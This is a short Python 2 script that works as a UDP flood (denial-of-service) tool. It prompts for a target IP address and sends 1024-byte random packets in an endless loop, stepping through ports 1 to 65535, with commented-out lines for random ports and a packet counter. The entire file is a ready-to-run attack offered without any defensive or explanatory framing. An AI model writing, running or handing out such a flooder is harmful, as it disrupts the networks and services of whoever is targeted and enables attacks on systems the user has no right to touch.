#!/usr/bin/python

import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setblocking(0)
bytes = random._urandom(1024)
ip=raw_input('Target IP:')
port = 1
#port=random.randint(1,65535)
#port=input('Port:')
sent=1

while 1:
    if port == 65535:
        port = 1
    sock.sendto(bytes,(ip,port))
#    print "Sent %s packets to %s on port %s." %(sent,ip,port)
    sent = sent + 1
    #port=random.randint(1,65535)
    port = port + 1
